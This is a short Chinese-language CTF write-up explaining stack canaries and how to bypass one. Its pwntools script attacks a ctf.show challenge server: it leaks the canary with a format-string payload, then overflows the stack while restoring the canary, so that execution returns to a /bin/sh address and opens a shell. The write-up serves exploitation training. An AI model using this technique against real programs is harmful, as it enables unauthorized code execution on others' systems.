# 挑战简介
Canary？有没有办法绕过呢？

# 思路
首先让我们了解Canary是什么  
简而言之，Canary只是一个4字节的随机数，其中后字节为\x00  

 程序执行时，会将Canary放入栈中，
 
 ![image](https://github.com/user-attachments/assets/59f58a5d-eec7-4621-b5f2-0fe6a523cb79)
如var_C所示，在程序执行完毕时，检查Canary的值有没有变动，变动则将程序立刻跳转异常  

位的就是防止栈溢出  

这就是Canary的保护机制  

这道题有两个get，很简单，把Canary爆出来就可以了  

爆出来后将Canary的值原封不动的交回去即可   

```
from pwn import *
from LibcSearcher import *
#context(arch = "amd64",os = 'linux',log_level = 'debug')

context(arch = "i386",os = 'linux',log_level = 'debug')

#io = process("./pwn")

io = remote('pwn.challenge.ctf.show',28205)

elf = ELF('D:\edge 下载\pwn')

bin_sh = 0x080486CE

payload = b'%15$x'

io.recv()

io.sendline(payload)

canary = int(io.recv(),16)

print(hex(canary))

offset = 0x34-0xc

payload2 = b'a'*offset + p32(canary) + b'a'*0xc + p32(bin_sh)

io.sendline(payload2)

io.interactive()
```
